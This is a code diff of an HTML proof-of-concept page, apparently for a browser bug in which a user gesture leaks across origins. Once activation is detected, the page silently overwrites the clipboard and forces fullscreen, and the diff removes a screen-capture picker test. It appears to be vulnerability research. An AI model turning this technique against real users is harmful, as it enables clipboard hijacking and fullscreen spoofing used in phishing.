@@ -13,11 +13,6 @@
 <body>
     <h1>Target Origin (GitHub)</h1>
     <p>Status Activation: <span id="status">WAITING...</span></p>
-
-    <div class="box" id="poc1">PoC 1: Clipboard Hijack - <span>Pending</span></div>
-    <div class="box" id="poc2">PoC 2: Forced Fullscreen - <span>Pending</span></div>
-    <div class="box" id="poc3">PoC 3: Media Picker - <span>Pending</span></div>
-
     <script>
         const statusEl = document.getElementById('status');
         const leakCheck = setInterval(async () => {
@@ -29,20 +24,10 @@
                 statusEl.className = "active";
                 try {
                     await navigator.clipboard.writeText("VULNERABLE_GHOST_GESTURE_DATA");
-                    document.querySelector('#poc1 span').innerText = "SUCCESS (Clipboard Modified!)";
-                    document.querySelector('#poc1 span').className = "success";
                 } catch (e) { console.log("Clipboard fail: " + e.message); }
                 try {
                     await document.documentElement.requestFullscreen();
-                    document.querySelector('#poc2 span').innerText = "SUCCESS (Fullscreen Triggered!)";
-                    document.querySelector('#poc2 span').className = "success";
                 } catch (e) { console.log("Fullscreen fail: " + e.message); }
-                try {
-                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                    document.querySelector('#poc3 span').innerText = "SUCCESS (Picker Opened!)";
-                    document.querySelector('#poc3 span').className = "success";
-                    stream.getTracks().forEach(t => t.stop());
-                } catch (e) { console.log("Media fail: " + e.message); }
             }
         }, 50);
     </script>
